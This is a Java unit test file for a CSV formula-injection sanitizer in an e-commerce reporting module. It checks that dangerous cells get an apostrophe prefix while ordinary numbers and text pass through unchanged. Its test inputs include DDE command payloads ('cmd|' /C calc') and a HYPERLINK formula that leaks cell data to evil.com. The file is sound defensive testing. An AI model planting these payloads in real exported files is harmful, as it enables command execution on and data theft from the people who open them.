package com.sellerintelligence.modules.reporting.security;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

@DisplayName("P021-BE: Testes do Sanitizador de Células contra CSV Formula Injection")
class CsvFormulaSanitizerTest {

    @ParameterizedTest(name = "Fórmula perigosa iniciada com {0} deve ser neutralizada")
    @ValueSource(strings = {
            "=SUM(A1:B10)",
            "=cmd|' /C calc'!A0",
            "=1+1",
            "@HYPERLINK(\"http://evil.com?leak=\"&A1,\"Clique aqui\")",
            "@SUM(1,2)",
            "|calc.exe",
            "+5-2*cmd",
            "-2+3*cmd|' /C calc'!A0",
            "-cmd|' /C calc'!A0"
    })
    void shouldNeutralizeDangerousFormulas(String dangerousInput) {
        String sanitized = CsvFormulaSanitizer.sanitize(dangerousInput);
        assertThat(sanitized).startsWith("'");
        assertThat(sanitized).isEqualTo("'" + dangerousInput);
    }

    @ParameterizedTest(name = "Evasão com espaços em branco ou controle antes da fórmula: {0}")
    @ValueSource(strings = {
            "   =1+1",
            "  @HYPERLINK",
            "  -cmd",
            "\t=SUM(A1)",
            "\r=cmd"
    })
    void shouldNeutralizeLeadingWhitespaceEvasions(String evasionInput) {
        String sanitized = CsvFormulaSanitizer.sanitize(evasionInput);
        assertThat(sanitized).startsWith("'");
    }

    @ParameterizedTest(name = "Valores numéricos legítimos não devem ser corrompidos: {0}")
    @ValueSource(strings = {
            "123",
            "-15.50",
            "+100",
            "0",
            "-0.01",
            "+5511999999999",
            "1000.50",
            "-250,75"
    })
    void shouldPreserveSafeNumericValues(String safeNumeric) {
        String sanitized = CsvFormulaSanitizer.sanitize(safeNumeric);
        assertThat(sanitized).isEqualTo(safeNumeric);
    }

    @ParameterizedTest(name = "Strings seguras não devem receber apóstrofo: {0}")
    @ValueSource(strings = {
            "Camiseta Polo Algodão",
            "SKU-12345-BR",
            "São Paulo - SP",
            "Entrega rápida Mercado Livre",
            "Garantia de 90 dias conforme CDC"
    })
    void shouldPreserveSafeTextValues(String safeText) {
        String sanitized = CsvFormulaSanitizer.sanitize(safeText);
        assertThat(sanitized).isEqualTo(safeText);
    }

    @Test
    void shouldHandleNullAndEmptyGracefully() {
        assertThat(CsvFormulaSanitizer.sanitize(null)).isEmpty();
        assertThat(CsvFormulaSanitizer.sanitize("")).isEmpty();
        assertThat(CsvFormulaSanitizer.sanitize("   ")).isEqualTo("   ");
    }
}
